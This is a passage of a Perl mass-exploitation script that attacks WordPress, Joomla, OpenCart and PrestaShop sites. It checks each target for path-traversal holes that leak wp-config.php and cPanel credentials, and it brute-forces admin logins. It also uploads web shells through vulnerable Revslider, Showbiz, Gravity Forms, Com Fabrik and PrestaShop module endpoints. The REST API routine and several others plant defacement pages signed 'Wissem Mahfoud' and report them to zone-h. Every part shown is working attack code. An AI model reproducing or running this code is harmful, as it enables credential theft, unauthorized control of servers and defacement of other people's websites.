my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "[Success] ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Wp-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "[Failed]";print color('bold white'),"\n";
    print color('reset');
	}}
	
	
	
	####################################################################################################

										sub com_42(){   print color('bold white'),"[Wp-mon] ............................. ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/plugins/wp-mon/assets/download.php?type=octet/stream&path=../../../../&name=wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "[Success] ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Wp-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "[Failed]";print color('bold white'),"\n";
    print color('reset');
	}}
	
	####################################################################################################

	
											sub com_43(){  print color('bold white'),"[Ibs-mappro] ......................... ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/plugins/ibs-mappro/lib/download.php?file=../../../../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "[Success] ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Wp-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "[Failed]";print color('bold white'),"\n";
    print color('reset');
	}}


####################################################################################################



sub getcpconfig{
print color('bold white'),"[Revslider Cpanel] ................... ";

$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (10);
$cpup = "wp-admin/admin-ajax.php?action=revslider_show_image&img=../../.my.cnf";
$cpuplink = "$site/$cpup";
$resp = $ua->request(HTTP::Request->new(GET => $cpuplink ));
$cont = $resp->content;
if($cont =~ m/user=/g && $cont =~ m/password=/g){
    print color('bold green');
print "[Success]\n";
    print color('reset');

    print save "[rev cpnl] $site\n";   
    close(save);
$resp = $ua->request(HTTP::Request->new(GET => $cpuplink ));
$contt = $resp->content;
while($contt =~ m/user/g){
        if ($contt =~ /user=(.*)/){

        print "\n\t[-]Cpanel User = $1 \n";
print color 'reset';
        open (TEXT, '>>Result/cp.txt');
        print TEXT "\n[ cpanel ] \n$site\n[-]cpanel user = $1";
        close (TEXT);
        }
        if ($contt =~ /password="(.*)"/){
        print "\t[-]Cpanel Pass = $1 \n\n";
print color 'reset';
        open (TEXT, '>>Result/cp.txt');
        print TEXT "\n[-]Cpanel Pass = $1";
        close (TEXT)
        }


}
}else{    print color('bold red');
print  "[Failed]\n";
    print color('reset');

}


}




######################
######################
######################
###### PMA SCAN ######
######################
######################
######################
sub pmaa{
print"[Php My Admin Wp] .................... ";

use HTTP::Request;
use LWP::UserAgent;
@pat=('/phpMyAdmin/','/phpmyadmin/');
foreach $pma(@pat){
chomp $pma;

$url = $site.$pma;
$req = HTTP::Request->new(GET=>$url);
$userAgent = LWP::UserAgent->new();
$response = $userAgent->request($req);
$ar = $response->content;
if ($ar =~ m/Welcome to phpMyAdmin|Username|Password/g){
    print color('bold green');
print "[Success]\n";
    print color('reset');
open (TEXT, '>>Result/config.txt');
print TEXT "\n[PhpMyAdmin] $url \n\n";
close (TEXT);

}else{

    print color('bold red');
print  "[Failed]\n";
    print color('reset');

}}

}
######################
######################
######################
## Wordpress Inject ##
######################
######################
######################
sub opencart{
print"[-] Starting brute force";
open(a,"<$pass") or die "$!";
while(<a>){
chomp($_);
$ocuser = admin;
$ocpass = $_;
print "\n[-] Trying: $ocpass ";
$OpenCart= $site . '/admin/index.php';

$ocbrute = POST $OpenCart, [username => $ocuser, password => $ocpass,];
$response = $ua->request($ocbrute);
$stat = $response->status_line;
if ($stat =~ /302/){
print "- ";
print color('bold green'),"FOUND\n";
print color('reset');
open (TEXT, '>>Result.txt');
print TEXT "$OpenCart => User: $ocuser Pass: $ocpass\n";
close (TEXT);
next OUTER;
}
}
}
######################
######################
######################
## Wordpress Inject ##
######################
######################
######################
sub wpinjetc($site){
print color('bold white'),"[Wordpress Inject] ................... ";

$linkposts = $site . 'index.php/wp-json/wp/v2/posts/';



$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
$ua->timeout (30);


$sorm = $ua->get($linkposts);
$karza = $sorm->content;
if($karza =~/\/?p=(.*?)\"\}/)
{
$id=$1;
$ajx = $site . '/wp-json/wp/v2/posts/'.$id;



	
$defx="														<h2><center>Wissem Mahfoud<center></h2>
						</div>
						<div class=\"post_content\">
							<p><title>HACKED by Wissem Mahfoud
</title></p>
<div style=\"text-align: center\"><font size=\"6\" face=\"comic sans ms\"><b>Hacked By Wissem Mahfoud</b></font></div>
<div style=\"text-align: center\"><font size=\"5\" face=\"comic sans ms\"><b><br /></b></font></div>
<div style=\"text-align: center\"><font size=\"5\" face=\"comic sans ms\"><b><font color=red>HACKED</font> By Wissem Mahfoud <font color=red>HACKED</font> By Wissem Mahfoud <font color=red>HACKED</font> By Wissem Mahfoud <font color=red>HACKED</font> BY Wissem Mahfoud <font color=red></div>
<div style=\"text-align: center\"><font size=\"5\" face=\"comic sans ms\"><b>Bazooka<br /></b></font></div>
<div style=\"text-align: center\"><font size=\"5\" face=\"comic sans ms\"><b></p>
<p>
						</div>";
$file="mah.html";
$sirina=$id . 'justracccwdata';
$def=  $site . 'mah.html';
$gassface = POST $ajx, ['id' => $sirina, 'title' => 'HACKED By Wissem Mahfoud', 'slug'=> $file,'content' => $defx];
$response = $ua->request($gassface);
$stat = $response->content;
	if ($stat =~ /Wissem Mahfoud/){
   print color('bold green');
print "[Succes]\n";
    print color('reset');
				    open(save, '>>Result/index.txt');  
    print save "$def\n";  
    close(save);
zoneh();

	}
else{
   print color('bold red');
print "[Failed]\n";
    print color('reset');}
}
else{
   print color('bold red');
print "[Failed]\n";
    print color('reset');}
}



######################
######################
######################
## Wordpress Brute ###
######################
######################
######################
sub wpbrute{
$red = $site . '/wp-admin/';
$wp= $site . 'wp-login.php';
$admin = "admin";

print"[Wordpress Brute] .................... ";


print "\n USER : $admin\nPASSWORD : $pass\n";
$brute = POST $wp, [log => $admin, pwd => $pass, wp-submit => 'Log In', redirect_to => $red];
$response = $ua->request($brute);
$stat = $response->status_line;
        if ($stat =~ /302/){
    print color('bold green');
print "[Success]\n";
    print color('reset');
        open (TEXT, '>>Result/brute.txt');
        print TEXT "\n$site/wp-login.php => User :$admin Password:$pass\n";
        close (TEXT);
        }else{
    print color('bold red');
print  "[Failed]\n";
    print color('reset');

}
pmaa();
}

######################
######################
######################
## Revslider Shell ###
######################
######################
######################
sub revshellv1(){
print color('bold white'),"[Revslider ShellV1] .................. ";

my $path = "wp-admin/admin-ajax.php";


my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
my $exploit = $ua->post("$site/$path", Cookie => "", Content_Type => "form-data", Content => [action => "revslider_ajax_action", client_action => "update_plugin", update_file => ["ak47.zip"]]);

if ($exploit->decoded_content =~ /Wrong update extracted folder/) {
print "[Wait]\n";
print " * Checking Shell Path..\n";
    print color('bold green');
print "[Success]\n";
    print color('reset');

my $check = $ua->get("$site/wp-content/plugins/revslider/temp/update_extract/revslider/cloud.php")->content;
if($check =~/Mahfoud/) {

	    print color('bold yellow');
print "[Uploading Shell] .................... ";
    print color('reset');
	    print color('bold green');
print "[Success]\n";
    print color('reset');

    open(save, '>>Result/Shell3z.txt');
    print save "[Revslider] : $site/wp-content/plugins/revslider/temp/update_extract/revslider/cloud.php\n";
    close(save); 
	$def = "$site/baz.html";
	zoneh();
    } else {  }
my $avada = $ua->get("$site/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/revslider/cloud.php")->content;
if($avada =~/Wissem Mahfoud/) {

	    print color('bold yellow');
print "[Uploading Shell] .................... ";
    print color('reset');
	    print color('bold green');
print "[Success]\n";
    print color('reset');    open(save, '>>Result/Shell3z.txt');
    print save "[Revslider] : $site/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/revslider/cloud.php\n";
    close(save); 
    	$def = "$site/baz.html";
	zoneh();

print "[Uploading Shell] .................... ";
    print color('reset');
	    print color('bold green');
print "[Success]\n";
    print color('reset');    open(save, '>>Result/Shell3z.txt');
    print save "[Revslider] : $site/wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/revslider/cloud.php\n";
    close(save); 
		$def = "$site/baz.html";
	zoneh();

}
else {  }
my $striking_r = $ua->get("$site/wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/revslider/cloud.php")->content;
if($striking_r =~/Wissem Mahfoud/) {

	    print color('bold yellow');
}
else {  }
my $IncredibleWP = $ua->get("$site/wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/revslider/cloud.php")->content;
if($IncredibleWP =~/Wissem Mahfoud/) {

	    print color('bold yellow');
print "[Uploading Shell] .................... ";
    print color('reset');
	    print color('bold green');
print "[Success]\n";
    print color('reset');    open(save, '>>Result/Shell3z.txt');
    print save "[Revslider] : $site/wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/revslider/cloud.php\n";
    close(save); 
		$def = "$site/baz.html";
	zoneh();

}
else {  }
my $ultimatum = $ua->get("$site/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/revslider/cloud.php")->content;
if($ultimatum =~/Wissem Mahfoud/) {

	    print color('bold yellow');
print "[Uploading Shell] .................... ";
    print color('reset');
	    print color('bold green');
print "[Success]\n";
    print color('reset');    open(save, '>>Result/Shell3z.txt');
    print save "[Revslider] : $site/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/revslider/cloud.php\n";
    close(save); 
		$def = "$site/baz.html";
	zoneh();

}
else {  }
my $medicate = $ua->get("$site/wp-content/themes/medicate/script/revslider/temp/update_extract/revslider/cloud.php")->content;
if($medicate =~/Wissem Mahfoud/) {

	    print color('bold yellow');
print "[Uploading Shell] .................... ";
    print color('reset');
	    print color('bold green');
print "[Success]\n";
    print color('reset');    open(save, '>>Result/Shell3z.txt');
    print save "[Revslider] : $site/wp-content/themes/medicate/script/revslider/temp/update_extract/revslider/cloud.php\n";
    close(save); 
		$def = "$site/baz.html";
	zoneh();

}
else {  }
my $centum = $ua->get("$site/wp-content/themes/centum/revslider/temp/update_extract/revslider/cloud.php")->content;
if($centum =~/Wissem Mahfoud/) {

	    print color('bold yellow');
print "[Uploading Shell] .................... ";
    print color('reset');
	    print color('bold green');
print "[Success]\n";
    print color('reset');    open(save, '>>Result/Shell3z.txt');
    print save "[Revslider] : $site/wp-content/themes/centum/revslider/temp/update_extract/revslider/cloud.php\n";
    close(save); 
		$def = "$site/baz.html";
	zoneh();

}
else {  }
my $beach_apollo = $ua->get("$site/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/revslider/cloud.php")->content;
if($beach_apollo =~/Wissem Mahfoud/) {

	    print color('bold yellow');
print "[Uploading Shell] .................... ";
    print color('reset');
	    print color('bold green');
print "[Success]\n";
    print color('reset');    open(save, '>>Result/Shell3z.txt');
    print save "[Revslider] : $site/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/revslider/cloud.php\n";
    close(save); 
		$def = "$site/baz.html";
	zoneh();

}
else { }
my $cuckootap = $ua->get("$site/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/revslider/cloud.php")->content;
if($cuckootap =~/Wissem Mahfoud/) {

	    print color('bold yellow');
print "[Uploading Shell] .................... ";
    print color('reset');
	    print color('bold green');
print "[Success]\n";
    print color('reset');    open(save, '>>Result/Shell3z.txt');
    print save "[Revslider] : $site/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/revslider/cloud.php\n";
    close(save); 
		$def = "$site/baz.html";
	zoneh();

}
else {  }
my $pindol = $ua->get("$site/wp-content/themes/pindol/revslider/temp/update_extract/revslider/cloud.php")->content;
if($pindol =~/Wissem Mahfoud/) {

    print "[+] pindol successfully uploaded\n";
    open(save, '>>Result/Shell3z.txt');
    print save "[Revslider] : $site/wp-content/themes/pindol/revslider/temp/update_extract/revslider/cloud.php\n";
    close(save); 
		$def = "$site/baz.html";
	zoneh();

}
else {  }
my $designplus = $ua->get("$site/wp-content/themes/designplus/framework/plugins/revslider/temp/update_extract/revslider/cloud.php")->content;
if($designplus =~/Wissem Mahfoud/) {

	    print color('bold yellow');
print "[Uploading Shell] .................... ";
    print color('reset');
	    print color('bold green');
print "[Success]\n";
    print color('reset');    open(save, '>>Result/Shell3z.txt');
    print save "[Revslider] : $site/wp-content/themes/designplus/framework/plugins/revslider/temp/update_extract/revslider/cloud.php\n";
    close(save); 
		$def = "$site/baz.html";
	zoneh();

}
else {  }
my $rarebird = $ua->get("$site/wp-content/themes/rarebird/framework/plugins/revslider/temp/update_extract/revslider/cloud.php")->content;
if($rarebird =~/Wissem Mahfoud/) {

	    print color('bold yellow');
print "[Uploading Shell] .................... ";
    print color('reset');
	    print color('bold green');
print "[Success]\n";
    print color('reset');
    open(save, '>>Result/Shell3z.txt');
    print save "[Revslider] : $site/wp-content/themes/rarebird/framework/plugins/revslider/temp/update_extract/revslider/cloud.php\n";
    close(save); 
		$def = "$site/baz.html";
	zoneh();

}
else {  }
my $andre = $ua->get("$site/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/revslider/cloud.php")->content;
if($andre =~/Wissem Mahfoud/) {

	    print color('bold yellow');
print "[Uploading Shell] .................... ";
    print color('reset');
	    print color('bold green');
print "[Success]\n";
    print color('reset');    open(save, '>>Result/Shell3z.txt');
    print save "[Revslider] : $site/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/revslider/cloud.php\n";
    close(save); 
		$def = "$site/baz.html";
	zoneh();

}
else { }
} else {
    print color('bold red');
print  "[Failed]\n";
    print color('reset');
}
}
######################
######################
######################
#showbiz
sub showbiz(){
print color('bold white'),"[Showbiz] ............................ ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
$ua->timeout (10);
sub upxx(){
my $zip_sho = "showbiz.zip";
my $action_sho = "showbiz_ajax_action";
my $update_file_sho = "$zip_sho";
my $path = "wp-admin/admin-ajax.php";
my $shell_path_sho = "wp-content/plugins/showbiz/temp/update_extract/showbiz/404.php";

my $exploit = $ua->post("$site/$path", Cookie => "", Content_Type => "form-data", Content => [action => "$action_sho", client_action => "update_plugin", update_file => ["$update_file_sho"]]);

if ($exploit->decoded_content =~ /Wrong update extracted folder/)
        {
        print "[+] Payload Executed Succeflly.\n";
        print "[~] Checking Shell.\n";
		my $conte = $ua->get("$site/$shell_path_sho")->content;
if ($conte =~/Wissem Mahfoud/){
print color('bold green');
print "[Sucess]\n$site/$shell_path_sho\n";
print color('reset');

                open (DONE, '>>Result/Shell3z.txt');
                print DONE "$site/$shell_path_sho\n";
}
        else
                {
    print color('bold red');
print  "[Failed]\n";
    print color('reset');
                }
        }

elsif ($exploit->decoded_content =~ /Wrong request/) {
    print color('bold red');
print  "[Failed]\n";
    print color('reset');
}

elsif ($exploit->decoded_content =~ m/0$/) {
    print color('bold red');
print  "[Failed]\n";
    print color('reset');
}

else {
$exploit->decoded_content =~ /<\/b>(.*?)<br>/;
    print color('bold red');
print  "[Failed]\n";
    print color('reset');
}
}
upxx();



}
######################
######################
######################

sub comfabr(){
print color('bold white'),"[Com Fabrik Shell] ................... ";


$comfab= $site . '/index.php?option=com_fabrik&c=import&view=import&filetype=csv&table=1';
$def = $site . '/media/mah.txt';
$fabshell = $site . '/media/cloud.php';
##
$indfile="RBJ/mah.txt";
$shelfile="RBJ/cloud.php";
##
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
my $indfab = $ua->post("$comfab", Cookie => "", Content_Type => "form-data", Content => ["userfile" => ["$shelfile"], "name" => "me.php", "drop_data" => "1", "overwrite" => "1", "field_delimiter" => ",", "text_delimiter" => "&quot;", "option" => "com_fabrik", "controller" => "import", "view" => "import", "task" => "doimport", "Itemid" => "0", "tableid" => "0"]);
my $checkfab = $ua->get("$fabshell")->content;
if($checkfab =~/Mahfoud/) {
    print color('bold green');
print  "[Sucess]\n";
    print color('reset');
        open (TEXT, '>>Result/Shell3z.txt');
        print TEXT "[COM FABRIC] =>$fabshell \n";
        close (TEXT);
}else{
    print color('bold red');
print  "[Failed]\n";
    print color('reset');

    }
}

sub indecomfabr(){
print color('bold white'), "[Com Fabrik index] ................... ";

    my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
    $ua->timeout(10);
    $ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
    my $indfab = $ua->post("$comfab", Cookie => "", Content_Type => "form-data", Content => ["userfile" => ["$indfile"], "name" => "me.php", "drop_data" => "1", "overwrite" => "1", "field_delimiter" => ",", "text_delimiter" => "&quot;", "option" => "com_fabrik", "controller" => "import", "view" => "import", "task" => "doimport", "Itemid" => "0", "tableid" => "0"]);
my $checkfab = $ua->get("$def")->content;
if($checkfab =~/Mahfoud/) {

    print color('bold green');
print  "[Sucess]\n";
    print color('reset');
zoneh();
            }else{
    print color('bold red');
print  "[Failed]\n";
    print color('reset');

                        }
}
######################
######################
######################
#####  Gravity  ######
######################
######################
######################
sub gravity(){
print color('bold white'), "[Gravity] ............................ ";

$site = $_;
my $path = "/?gf_page=upload";

my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
my $exploit = $ua->post("$site/$path", Cookie => "", Content_Type => "form-data", Content => [file => ["Grav.jpg"], field_id => "3", form_id => "1",gform_unique_id => "../../../", name => "css.php.jd"]);
if ($exploit->decoded_content =~ /_input_3_css.php.jd/) {
	


my $check = $ua->get("$site/wp-content/uploads/_input_3_css.php.jd")->content;
my $checkk = $ua->get("$site/wp-includes/wp-footer.php")->content;
if($checkk =~/Wissem Mahfoud/) {
print "[Success]\n";

    open(save, '>>Result/Shell3z.txt');
	
    print save "$site/wp-includes/wp-footer.php\n";
	
    close(save);
}else {
     print color('bold red');
print "[Failed]\n";
    print color('reset');
}

  my $checkkk = $ua->get("$site/baz.html")->content;
    if($checkkk =~m/Wissem Mahfoud/i) {
  
		
        open(save, '>>Result/index.txt');
        print save "$site/del.html\n";
        close(save);
	$def="$site/baz.html";
	zoneh();
} 
}else {
     print color('bold red');
print "[Failed]\n";
    print color('reset');

}

	
}

	




sub upindex{
print color('bold white'), "[Index gravity] ...................... ";
my $path = "/?gf_page=upload";
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
my $indexploit = $ua->post("$site/$path", Cookie => "", Content_Type => "form-data", Content => [file => ["ak47.jpg"], field_id => "3", form_id => "1",gform_unique_id => "../../../../../", name => "mahfoud.html"]);
if ($indexploit->decoded_content =~ /_input_3_mahfoud.html/) {
    $def= $site . '/_input_3_mahfoud.html';
	    print color('bold green');
    print "[Sucess]\n$def\n";
    print color('reset');

    open(save, '>>Result/index.txt');
    print save "[Gravity] : $def\n";
    close(save);
        zoneh();
       }else{
    print color('bold red');
print  "[Failed]\n";
    print color('reset');
       }
   }
######################
######################
######################
#####  job-mang   ####
######################
######################
######################

sub jombmang(){
print color('bold white'),"[Job Manger Exploit] ................. ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
$ua->timeout (10);
$link ="$site/jm-ajax/upload_file";
my $conte = $ua->get("$link")->content;
if($conte =~/{"files/) {
   
    print color("green"), "[vuln]";
    print color('reset');
    print " $site\n";
    open(save, '>>job.txt');
    print save "$site/post-a-job/\n";   
    close(save);
    tazz();
}else{
   print color('bold red');
print "[Failed]\n";
    print color('reset');
	}

}

sub tazz(){
my $url = "$site/jm-ajax/upload_file/";
my $picture ="m.gif"; # Change m.gif By Your PICTURE Name
my $field_name = "file[]";

my $response = $ua->post( $url,
            Content_Type => 'form-data',
            Content => [ $field_name => ["$picture"] ]
           
            );

$def = $site. '/wp-content/uploads/job-manager-uploads/file/2017/06/m.gif'; # Change m.gif By Your PICTURE Name
			$check = $ua->get($def)->status_line;
if ($check =~ /200/){
   print color('bold green');
print "[Success]\n";
    print color('reset');
print color('reset');
open(save, '>>Result/index.txt');   
print save "$def\n";   
close(save);
zoneh();
}else{
print "[Failed]\n";
}
}

######################################################
#################### PrestaShoP ######################
######################################################
################ columnadverts #####################
sub columnadverts(){
my $url = "$site/modules/columnadverts/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["XBazooka.php"],]);

$columnadvertsup="$site/modules/columnadverts/slides/XBazooka.php?X=Bazooka";

my $checkcolumnadverts = $ua->get("$columnadvertsup")->content;
if($checkcolumnadverts =~/X Bazooka/) {

print color('bold white'),"[columnadverts]";
print color('bold white')," ..................... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $columnadvertsup\n";
open (TEXT, '>>Result/Shell3z.txt');
print TEXT "$columnadvertsup\n";
close (TEXT);
}else{
print color('bold white'),"[columnadverts]";
print color('bold white')," ..................... ";
print color('bold red'),"[Failed]\n";
}
}


################ soopamobile #####################
sub soopamobile(){
my $url = "$site/modules/soopamobile/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["XBazooka.php"],]);

$soopamobileup="$site/modules/soopamobile/slides/XBazooka.php?X=Bazooka";

my $checksoopamobile = $ua->get("$soopamobileup")->content;
if($checksoopamobile =~/X Bazooka/) {
print color('bold white'),"[soopamobile]";
print color('bold white')," ....................... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $soopamobileup\n";
open (TEXT, '>>Result/Shell3z.txt');
print TEXT "$soopamobileup\n";
close (TEXT);
}else{
print color('bold white'),"[soopamobile]";
print color('bold white')," ....................... ";
print color('bold red'),"[Failed]\n";
}
}

################ soopabanners #####################
sub soopabanners(){
my $url = "$site/modules/soopabanners/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["XBazooka.php"],]);

$soopabannersup="$site/modules/soopabanners/slides/XBazooka.php?X=Bazooka";

my $checksoopabanners = $ua->get("$soopabannersup")->content;
if($checksoopabanners =~/X Bazooka/) {

print color('bold white'),"[soopabanners]";
print color('bold white')," ...................... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $soopabannersup\n";
open (TEXT, '>>Result/Shell3z.txt');
print TEXT "$soopabannersup\n";
close (TEXT);
}else{
print color('bold white'),"[soopabanners]";
print color('bold white')," ...................... ";
print color('bold red'),"[Failed]\n";
}
}

################ vtermslideshow #####################
sub vtermslideshow(){
my $url = "$site/modules/vtermslideshow/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["XBazooka.php"],]);

$vtermslideshowup="$site/modules/vtermslideshow/slides/XBazooka.php?X=Bazooka";

my $checkvtermslideshow = $ua->get("$vtermslideshowup")->content;
if($checkvtermslideshow =~/X Bazooka/) {

print color('bold white'),"[Vtermslideshow]";
print color('bold white')," .................... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $vtermslideshowup\n";
open (TEXT, '>>Result/Shell3z.txt');
print TEXT "$vtermslideshowup\n";
close (TEXT);
}else{
print color('bold white'),"[Vtermslideshow]";
print color('bold white')," .................... ";
print color('bold red'),"[Failed]\n";
}
}

################ simpleslideshow #####################
sub simpleslideshow(){
my $url = "$site/modules/simpleslideshow/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["XBazooka.php"],]);

$simpleslideshowup="$site/modules/simpleslideshow/slides/XBazooka.php?X=Bazooka";

my $checksimpleslideshow = $ua->get("$simpleslideshowup")->content;
if($checksimpleslideshow =~/X Bazooka/) {

print color('bold white'),"[simpleslideshow]";
print color('bold white')," ................... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $simpleslideshowup\n";
open (TEXT, '>>Result/Shell3z.txt');
print TEXT "$simpleslideshowup\n";
close (TEXT);
}else{
print color('bold white'),"[simpleslideshow]";
print color('bold white')," ................... ";
print color('bold red'),"[Failed]\n";
}
}

################ productpageadverts #####################
sub productpageadverts(){
my $url = "$site/modules/productpageadverts/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["XBazooka.php"],]);

$productpageadvertsup="$site/modules/productpageadverts/slides/XBazooka.php?X=Bazooka";

my $checkproductpageadverts = $ua->get("$productpageadvertsup")->content;
if($checkproductpageadverts =~/X Bazooka/) {

print color('bold white'),"[productpageadverts]";
print color('bold white')," ................ ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $productpageadvertsup\n";
open (TEXT, '>>Result/Shell3z.txt');
print TEXT "$productpageadvertsup\n";
close (TEXT);
}else{

print color('bold white'),"[productpageadverts]";
print color('bold white')," ................ ";
print color('bold red'),"[Failed]\n";
}
}

################ homepageadvertise #####################
sub homepageadvertise(){
my $url = "$site/modules/homepageadvertise/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["XBazooka.php"],]);

$homepageadvertiseup="$site/modules/homepageadvertise/slides/XBazooka.php?X=Bazooka";

my $checkhomepageadvertise = $ua->get("$homepageadvertiseup")->content;
if($checkhomepageadvertise =~/X Bazooka/) {

print color('bold white'),"[homepageadvertise]";
print color('bold white')," ................. ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $homepageadvertiseup\n";
open (TEXT, '>>Result/Shell3z.txt');
print TEXT "$homepageadvertiseup\n";
close (TEXT);
}else{
print color('bold white'),"[homepageadvertise]";
print color('bold white')," ................. ";
print color('bold red'),"[Failed]\n";
}
}

################ homepageadvertise2 #####################
sub homepageadvertise2(){
my $url = "$site/modules/homepageadvertise2/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["XBazooka.php"],]);

$homepageadvertise2up="$site/modules/homepageadvertise2/slides/XBazooka.php?X=Bazooka";

my $checkhomepageadvertise2 = $ua->get("$homepageadvertise2up")->content;
if($checkhomepageadvertise2 =~/X Bazooka/) {


print color('bold white'),"[homepageadvertise2]";
print color('bold white')," ................ ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $homepageadvertise2up\n";
open (TEXT, '>>Result/Shell3z.txt');
print TEXT "$homepageadvertise2up\n";
close (TEXT);
}else{

print color('bold white'),"[homepageadvertise2]";
print color('bold white')," ................ ";
print color('bold red'),"[Failed]\n";
}
}

################ jro_homepageadvertise #####################
sub jro_homepageadvertise(){
my $url = "$site/modules/jro_homepageadvertise/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["XBazooka.php"],]);

$jro_homepageadvertiseup="$site/modules/jro_homepageadvertise/slides/XBazooka.php?X=Bazooka";

my $checkjro_homepageadvertise = $ua->get("$jro_homepageadvertiseup")->content;
if($checkjro_homepageadvertise =~/X Bazooka/) {

print color('bold white'),"[jro_homepageadvertise]";
print color('bold white')," ............. ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $jro_homepageadvertiseup\n";
open (TEXT, '>>Result/Shell3z.txt');
